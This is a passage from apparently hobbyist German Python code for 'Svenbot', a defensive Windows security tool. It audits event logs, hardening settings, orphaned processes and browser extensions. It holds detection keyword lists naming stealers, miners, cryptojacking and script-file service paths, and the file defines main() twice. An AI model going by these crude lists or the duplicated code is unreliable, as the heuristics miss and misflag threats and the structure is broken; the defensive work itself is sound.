            service = re.search(r"Service Name:\s+([^\s]+)", msg)
            path = re.search(r"Service File Name:\s+([^\s]+)", msg)
            service = service.group(1) if service else "unbekannt"
            path = path.group(1) if path else "unbekannt"
            service_installs.append((time, service, path))
            print(f"⚠️ Neuer Dienst installiert: {service} ({path}) um {time}")
            if any(x in path.lower() for x in ["temp", "appdata", "downloads", ".ps1", ".bat", ".vbs", ".js"]):
                print(" ➤ Verdächtiger Pfad/Dateityp für Dienst! Sofort prüfen.")
        # 1102: Security-Log gelöscht
        elif eid == 1102:
            log_clears.append(time)
            print(f"🚨 Das Security-Log wurde gelöscht/geleert! ({time})")
        # 4740: Konto gesperrt
        elif eid == 4740:
            user = re.search(r"Account Name:\s+([^\s]+)", msg)
            user = user.group(1) if user else "unbekannt"
            locked_accounts.append((time, user))
            print(f"🔒 Konto wurde gesperrt: {user} ({time})")
        # 4624: Erfolgreiche Anmeldung (nur explizit auffällige)
        elif eid == 4624:
            if "Logon Type: 10" in msg or "Logon Type: 3" in msg:
                user = re.search(r"Account Name:\s+([^\s]+)", msg)
                user = user.group(1) if user else "unbekannt"
                suspicious_logons.append((time, user))
                print(f"⚠️ Remote/Netzwerk-Login: {user} ({time})")
        # Alle anderen auffälligen Events
        elif eid in (4722, 4723, 4724, 4729, 4733, 4672, 4768, 4769):
            suspect_events.append((eid, time, msg))
            print(f"ℹ️ {beschreibung.get(eid, 'Security-Event')} ({time}): {msg[:80]}...")

    # Zusammenfassende Bewertung
    print("\nSven sagt: Eventlog-Auswertung abgeschlossen – hier die wichtigsten Punkte:")
    print(f"- Fehlgeschlagene Anmeldeversuche: {brute_force_count}")
    print(f"- Neue Benutzer erstellt: {len(user_creations)}")
    print(f"- Benutzer zu Admin-/Systemgruppen hinzugefügt: {len(admin_adds)}")
    print(f"- Neue Dienste installiert: {len(service_installs)}")
    print(f"- Security-Log gelöscht: {len(log_clears)}")
    print(f"- Gesperrte Konten: {len(locked_accounts)}")
    print(f"- Remote/Netzwerk-Logins (auffällig): {len(suspicious_logons)}")
    print(f"- Weitere sicherheitsrelevante Events: {len(suspect_events)}")

    if brute_force_count > 20 or log_clears or service_installs or user_creations or admin_adds or locked_accounts:
        print("\n🚨 Mindestens ein kritischer Vorfall im Security-Log! Sofort recherchieren, was dahintersteckt.")
    else:
        print("\nSven sagt: Keine hochkritischen Events im Security-Log der letzten Tage gefunden. Aber immer schön wachsam bleiben!")

    # Kurze Erklärung für Menschen ohne SIEM
    print("\nKurzerklärung:")
    print("- Windows schreibt ALLE sicherheitsrelevanten Aktionen in das Security-Log.")
    print("- Viele fehlgeschlagene Anmeldungen = Brute-Force-Angriff oder Tippfehler-Orgien.")
    print("- Neue User/Admins, Dienst-Installationen, Loglöschungen = ALARMSIGNAL!")
    print("- Wenn hier Verdacht aufkommt: Vorfälle sofort mit Zeit und Namen notieren & Ursachen klären.")

def system_hardening_audit():
    print("\n[Svenbot: Systemhärtungs- & Schwachstellen-Check – Die Basics, die Hacker wirklich suchen!]")
    print("Jeder Fund wird MIT Erklärung bewertet. Keine Panik, kein Spam. Nur das, was für Angreifer relevant ist.\n")

    # 1. UAC-Status
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System") as key:
            uac_level, _ = winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")
        # 2=Immer bestätigen, 5=Default (Standard), 0=Nie, 1=Bestätigung ohne Dialog
        if uac_level == 2 or uac_level == 5:
            print("🟢 UAC ist aktiv: Programme mit Adminrechten benötigen Bestätigung.")
        elif uac_level == 0:
            print("🔴 UAC ist AUS! Jeder Prozess kann Admin ohne Nachfragen werden. ⚠️")
            print("   Erklärung: UAC schützt vor stiller Rechte-Ausweitung durch Malware. Ohne UAC kann JEDER Prozess Admin werden, ohne dass du es merkst.")
        else:
            print(f"🟡 UAC läuft in ungewöhnlichem Modus ({uac_level}). Prüfe deine UAC-Einstellungen.")
    except Exception as e:
        print("❓ UAC-Status konnte nicht geprüft werden – evtl. fehlen Rechte.")

    # 2. SMBv1-Status
    try:
        smb1 = subprocess.check_output(
            'powershell -Command "Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol"', 
            shell=True, text=True, stderr=subprocess.DEVNULL)
        if "Enabled" in smb1 and "State : Enabled" in smb1:
            print("🔴 SMBv1 ist AKTIVIERT! ⚠️")
            print("   Erklärung: SMBv1 ist uralt und wurde von Ransomware wie WannaCry ausgenutzt. SOFORT deaktivieren, falls nicht explizit für alte Geräte benötigt.")
        else:
            print("🟢 SMBv1 ist deaktiviert – sehr gut, aktuelle Sicherheit.")
    except Exception:
        print("❓ SMBv1-Status konnte nicht geprüft werden. Nutzt du wirklich Windows?")

    # 3. RDP (Remote Desktop) Status
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server") as key:
            rdp_enabled, _ = winreg.QueryValueEx(key, "fDenyTSConnections")
        if rdp_enabled == 0:
            print("🟡 RDP (Remote Desktop) ist AKTIV!")
            print("   Erklärung: Remote Desktop ermöglicht Fernzugriff auf deinen PC. Ist es absichtlich aktiv? Ohne starke Passwörter/Firewall ist das ein massiver Angriffsvektor.")
        else:
            print("🟢 RDP ist deaktiviert – kein Remote Desktop offen.")
    except Exception:
        print("❓ Konnte RDP-Status nicht prüfen.")

    # 4. Office-Makros
    office_versions = ["16.0", "15.0", "14.0"]  # 2016, 2013, 2010
    found_macro_warning = False
    for ver in office_versions:
        for prog in ["Word", "Excel"]:
            regpath = fr"Software\Microsoft\Office\{ver}\{prog}\Security"
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, regpath) as key:
                    macros, _ = winreg.QueryValueEx(key, "VBAWarnings")
                # 1=alle Makros aktiviert, 2=Makros mit Warnung, 3=alle deaktiviert, 4=nur signierte Makros
                if macros == 1:
                    print(f"🔴 {prog} {ver}: Alle Makros sind AKTIVIERT! ⚠️")
                    print(f"   Erklärung: Makros sind eine Hauptquelle für Office-Malware. Deaktiviere Makros, wenn nicht absolut nötig!")
                    found_macro_warning = True
                elif macros == 2:
                    print(f"🟡 {prog} {ver}: Makros aktivierbar, aber mit Warnung.")
                elif macros == 3:
                    print(f"🟢 {prog} {ver}: Makros sind deaktiviert – sicher.")
                elif macros == 4:
                    print(f"🟢 {prog} {ver}: Nur signierte Makros erlaubt – ok.")
                else:
                    print(f"❓ {prog} {ver}: Unerwarteter Makro-Wert ({macros})")
            except FileNotFoundError:
                continue
            except Exception:
                continue
    if not found_macro_warning:
        print("🟢 Office-Makros: Keine globalen Gefahreneinstellungen gefunden.")

    # 5. Defender/Exploit Protection Status (Basics, kein Spam)
    try:
        defender = subprocess.check_output("sc query WinDefend", shell=True, text=True)
        if "RUNNING" in defender:
            print("🟢 Windows Defender läuft – Basisschutz aktiv.")
        else:
            print("🔴 Defender ist AUS! Kein Echtzeitschutz aktiv. ⚠️")
            print("   Erklärung: Ohne aktiven AV bist du das perfekte Opfer für klassische Angriffe. Prüfe, ob ein anderer AV aktiv ist.")
    except Exception:
        print("❓ Defender-Status konnte nicht abgefragt werden.")

    # 6. Windows Update Status (Basic Check)
    try:
        wu = subprocess.check_output(
            'powershell -Command "Get-Service -Name wuauserv"', shell=True, text=True)
        if "Running" in wu or "Läuft" in wu:
            print("🟢 Windows Update-Dienst ist aktiv.")
        else:
            print("🔴 Windows Update-Dienst ist AUS! Keine Sicherheitsupdates! ⚠️")
            print("   Erklärung: Wenn der Update-Dienst gestoppt ist, erhält dein System keine Sicherheitspatches. Unbedingt aktivieren!")
    except Exception:
        print("❓ Konnte Windows Update Status nicht prüfen.")

    # 7. Exploit Protection (DEP) – Optional, tief, kein False Positive
    try:
        ep = subprocess.check_output(
            'powershell -Command "Get-ProcessMitigation -System"', shell=True, text=True)
        if "DEP : ON" in ep or "DEP: ON" in ep:
            print("🟢 DEP (Data Execution Prevention) ist aktiv – Basis-Exploit-Schutz läuft.")
        else:
            print("🟡 DEP ist NICHT aktiv. Moderne Exploits haben es leichter.")
    except Exception:
        print("❓ DEP/ExploitProtection-Status konnte nicht geprüft werden.")

    print("\nFERTIG! Nur wirklich gefährliche Einstellungen wurden gemeldet – alles kommentiert.")
    print("Erklärung:\n- Grün: Sicher/empfohlen\n- Gelb: Mögliches Risiko\n- Rot: KRITISCHE Schwachstelle\n- ❓: Nicht prüfbar (Rechte/Version)\n")
    print("WICHTIG: Diese Liste deckt NUR die wirklich relevanten Angriffsvektoren ab, die bei Ransomware, Malware & echten Angriffen eine Rolle spielen.")
    print("Weitere tiefe Checks (z.B. ExploitGuard, ASR Rules, WDAC, LAPS, Secure Boot) kannst du bei Bedarf modular ergänzen.\n")

def zombie_process_finder_advanced():

    try:
        import win32gui
        import win32process
        has_win32 = True
    except ImportError:
        has_win32 = False

    print("\n[Svenbot: Zombie-/Leichen-Prozess-Scanner – Advanced Edition]\n")

    # Dynamische Schwellenwerte je nach RAM
    total_ram = psutil.virtual_memory().total // (1024 * 1024)
    if total_ram >= 12000:
        MIN_RAM_MB = 200
    elif total_ram >= 8000:
        MIN_RAM_MB = 100
    else:
        MIN_RAM_MB = 50
    MIN_RUNTIME_MIN = 60
    now = datetime.datetime.now()

    zombie_candidates = []
    legit_systems = [
        "explorer.exe", "svchost.exe", "lsass.exe", "csrss.exe", "winlogon.exe",
        "dwm.exe", "fontdrvhost.exe", "services.exe", "audiodg.exe", "searchui.exe"
    ]
    whitelist_helper = [
        "adobeupdater.exe", "teamsmachineinstaller.exe", "logitechupdater.exe", "onenoteim.exe"
    ]

    # Alle sichtbaren Fenster-PIDs ermitteln (falls möglich)
    visible_pids = set()
    if has_win32:
        def enum_win_proc(hwnd, result):
            try:
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                if win32gui.IsWindowVisible(hwnd):
                    result.add(pid)
            except Exception:
                pass
        win32gui.EnumWindows(enum_win_proc, visible_pids)

    for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent', 'create_time', 'ppid', 'exe', 'status']):
        try:
            name = (proc.info['name'] or "").lower()
            pid  = proc.info['pid']
            ppid = proc.info['ppid']
            ram_mb = proc.info['memory_info'].rss // (1024*1024)
            start = datetime.datetime.fromtimestamp(proc.info['create_time'])
            age_min = (now - start).total_seconds() // 60
            cpu = proc.cpu_percent(interval=0.2)
            exe = (proc.info.get('exe') or "").lower()
            status = proc.info.get('status', "")
            user = proc.info.get('username', '???')

            # Whitelist: System, Updater, legitime Programme/Pfade
            if name in legit_systems and (exe.startswith("c:\\windows") or exe == ""):
                continue
            if name in whitelist_helper:
                continue

            # Fenster vorhanden? (Win32 check)
            has_window = has_win32 and (pid in visible_pids)

            # Keine User-Interaktion / Fenster
            if ppid == 0 or ppid == 4:
                parent_dead = True
            else:
                try:
                    parent = psutil.Process(ppid)
                    parent_dead = False
                except psutil.NoSuchProcess:
                    parent_dead = True

            # Optional: IO-Status
            try:
                io_stats = proc.io_counters()
                io_hint = f"Open handles: {getattr(proc, 'num_handles', lambda: '?')()}" if hasattr(proc, 'num_handles') else ""
            except Exception:
                io_hint = ""

            # Zombie/Leiche: alt, viel RAM, keine Fenster, inaktiver Elternprozess
            if (
                age_min > MIN_RUNTIME_MIN
                and ram_mb > MIN_RAM_MB
                and cpu < 5.0
                and not has_window
                and (parent_dead or status.lower() in ("stopped", "zombie"))
            ):
                zombie_candidates.append({
                    'pid': pid,
                    'name': name,
                    'ram': ram_mb,
                    'cpu': cpu,
                    'age_min': int(age_min),
                    'exe': exe,
                    'user': user,
                    'parent_dead': parent_dead,
                    'io_hint': io_hint,
                    'status': status
                })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    if not zombie_candidates:
        print("🟢 Keine auffälligen Prozessleichen entdeckt! Dein System ist sauber – oder es sind wirklich gut getarnte Zombies unterwegs.\n")
        return

    print(f"⚡ Es wurden {len(zombie_candidates)} mögliche Zombie-Prozesse gefunden:\n")

    for z in zombie_candidates:
        print(f"PID {z['pid']:>5} | RAM: {z['ram']:>4} MB | CPU: {z['cpu']:>4.1f}% | Laufzeit: {z['age_min']:>4} Min | User: {z['user']}")
        print(f"   Name: {z['name']} | Pfad: {z['exe'] or '[kein Pfad]'} | Status: {z['status']} {z['io_hint']}")
        if z['parent_dead']:
            print("   ⚠️  Elterprozess ist tot/nicht auffindbar – klassisches Zombie-Verhalten!")
        if not z['exe'] or z['exe'].startswith(r"c:\users") or "appdata" in z['exe'].lower():
            print("   ⚠️  Prozess läuft aus USER-/AppData-Pfad – verdächtig!")
        print("   Erklärung: RAM-lastige, fensterlose, alte Prozesse ohne Parent sind oft Überreste von Malware, Instabilitäten oder abgestürzten Programmen.")
        print("   → Wenn dir Name/Pfad nichts sagen: Ggf. Prozess killen & prüfen.\n")

def scan_browser_extensions():
    print("\n----- Svenbot Browser-Extrem-Detektor -----")

    user = getpass.getuser()
    userprofile = os.environ.get("USERPROFILE", f"C:\\Users\\{user}")

    browsers = [
        ("Chrome", os.path.join(userprofile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Extensions")),
        ("Edge", os.path.join(userprofile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Extensions")),
        ("Brave", os.path.join(userprofile, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Extensions")),
        ("Vivaldi", os.path.join(userprofile, "AppData", "Local", "Vivaldi", "User Data", "Default", "Extensions")),
        ("Opera", os.path.join(userprofile, "AppData", "Roaming", "Opera Software", "Opera Stable", "Extensions")),
        ("Opera GX", os.path.join(userprofile, "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Extensions")),
    ]

    evil = ["miner", "stealer", "adware", "cryptojack", "remote", "proxy", "inject", "hacker", "wallet", "suspicious", "spy"]

    for browser, ext_path in browsers:
        print(f"\n[{browser} Extensions:]")
        if not os.path.exists(ext_path):
            print("  Keine Installation gefunden.")
            continue
        ext_dirs = os.listdir(ext_path)
        if not ext_dirs:
            print("  Keine Erweiterungen installiert.")
            continue
        for ext_id in ext_dirs:
            ext_dir = os.path.join(ext_path, ext_id)
            if not os.path.isdir(ext_dir):
                continue
            # Finde alle Versionen (Ordner)
            for version in os.listdir(ext_dir):
                manifest = os.path.join(ext_dir, version, "manifest.json")
                if os.path.exists(manifest):
                    try:
                        with open(manifest, encoding='utf-8') as f:
                            data = json.load(f)
                            name = data.get("name", "Unbekannt")
                            version_str = data.get("version", "?")
                            desc = data.get("description", "")
                            print(f"  - {name} (ID: {ext_id}, Version: {version_str})")
                            if any(word in name.lower() or word in desc.lower() for word in evil):
                                print("    *** Verdächtige Extension! ***")
                    except Exception as e:
                        print(f"  - Konnte Manifest nicht lesen: {e}")

    # Firefox
    print("\n[Firefox Extensions:]")
    ff_profiles = glob.glob(os.path.join(userprofile, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", "*"))
    found_any = False
    for profile in ff_profiles:
        ext_json = os.path.join(profile, "extensions.json")
        if os.path.exists(ext_json):
            found_any = True
            with open(ext_json, encoding='utf-8') as f:
                try:
                    extdata = json.load(f)
                    addons = extdata.get("addons", [])
                    for addon in addons:
                        name = addon.get("defaultLocale", {}).get("name", addon.get("name", "Unbekannt"))
                        version = addon.get("version", "?")
                        desc = addon.get("defaultLocale", {}).get("description", "")
                        active = addon.get("active", False)
                        print(f"  - {name} (Version: {version}) [{'Aktiv' if active else 'Deaktiviert'}]")
                        if any(word in name.lower() or word in desc.lower() for word in evil):
                            print("    *** Verdächtige Extension! ***")
                except Exception as e:
                    print(f"  - Konnte Firefox-Extension nicht lesen: {e}")
    if not found_any:
        print("  Keine Firefox-Profile/Erweiterungen gefunden.")

    print("\n----- Check abgeschlossen. -----")
    print("Tipp: Weniger Extensions = weniger Angriffsfläche. Lieber auf Nummer sicher!\n")

def zeige_rechtliches():
    print("""
┌──────────────────────────────────────────────────────────────────────────────┐
│  Svenbot – Systemanalyse & Sicherheitsmonitoring                             │
│                                                                              │
│  Haftungsausschluss:                                                         │
│  Dieses Tool dient ausschließlich zu Analyse-, Monitoring- und Bildungszwecken│
│  auf eigenen oder autorisierten Systemen. Ein Einsatz auf fremden Geräten    │
│  ohne ausdrückliche Zustimmung ist untersagt und kann strafbar sein!         │
│                                                                              │
│  Funktionsweise Svenbot:                                                     │
│   – Analysiert laufende Prozesse, Ports, Registry, Named Pipes und Systemstatus│
│     auf Sicherheitsrisiken und ungewöhnliche Aktivitäten.                    │
│   – Erkennt verdächtige Verbindungen und potenzielle Angriffsindikatoren.    │
│   – GeoIP-Auswertung erfolgt **standardmäßig lokal** mittels GeoLite2-Datenbank│
│     (keine externen Anfragen, volle Privatsphäre).                           │
│   – Optional: Alte GeoIP-Optionen (ip-api.com) sind entfernt oder deaktiviert.│
│   – Alle Analyselogdateien verbleiben **lokal auf dem eigenen System**.      │
│                                                                              │
│  Datenschutz & Privatsphäre:                                                 │
│   – Kein externer Datenversand, keine Cloud, keine API, alles offline.       │
│   – Analyse-Logs und Ergebnisse werden nicht automatisch weitergegeben.      │
│                                                                              │
│  Der Autor übernimmt keinerlei Haftung für Schäden, Datenverluste oder       │
│  Gesetzesverstöße durch unsachgemäße Nutzung dieses Programms.               │
│                                                                              │
│  Drittanbieter-Hinweise & Lizenzen:                                          │
│                                                                              │
│   – 					    | Microsoft Software License Terms │
│   – pywin32 (Mark Hammond)                | MIT-Lizenz                      │
│   – psutil                                | BSD-Lizenz                      │
│   – geoip2                                | Apache 2.0                       │
│   – requests                              | Apache 2.0                      │
│   – netsh.exe (Windows)                   | Bestandteil von MS Windows       │
│   – Python Standardbibliothek             | Python Software Foundation       │
│   – GeoLite2 (MaxMind)                    | Kostenlose Lizenz (nur lokal)    │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
""")

def main():
    sven = Sven()
    print("\n╔════════════════════════════════════════════════════════════════╗")
    print("║                       Willkommen bei Svenbot                  ║")
    print("║         Dein sarkastischer Windows-Security-Analyst           ║")
    print("╠════════════════════════════════════════════════════════════════╣")
    print("║ Svenbot scannt, überwacht, warnt und protokolliert            ║")
    print("║ – mit mehr Paranoia als dein IT-Dozent und weniger Bullshit   ║")
    print("║ als jede kommerzielle Antivirensoftware.                      ║")
    print("║                                                              ║")
    print("║  Menü starten… und staunen, was auf deinem PC wirklich läuft. ║")
    print("╚════════════════════════════════════════════════════════════════╝\n")
    time.sleep(1)

import time  # Nicht vergessen!

# Beispiel-Sven-Klasse (kannst du beliebig erweitern!)
class Sven:
    def tick(self):
        # Hier kommt der sarkastische Systemkommentar, wenn du willst
        # print("Svenbot tickt weiter ...")  # Optional
        pass  # Oder mit Inhalt füllen

def main():
    sven = Sven()  # <--- Sven-Objekt anlegen!
    while True:
        print("\nWas möchtest du tun?")
        print("(q) Quit | (m) Monitoring-Modus | (x) Sicherheitscheck | (p) Port-Check | (z) Sicherheitstools | (e) Forensik-Export | (r) Rechtliches & Lizenzen")
        wahl = input("> ").lower()

        if wahl == 'q':
            print("Okay, Sven wird jetzt chillen. Bis bald!")
            break
        elif wahl == 'm':
            erweitertes_monitoring()
        elif wahl == 'x':
            sicherheitsmonitoring_kompakt()
        elif wahl == 'p':
            port_checker()
        elif wahl == 'z':
            sicherheits_tools()
        elif wahl == 'e':
            forensik_export()
        elif wahl == 'r':
            zeige_rechtliches()
        else:
            print("Ungültige Eingabe. Versuch's nochmal.")

        sven.tick()
        time.sleep(1)

    print("Spiel beendet.")

if __name__ == "__main__":
    main()
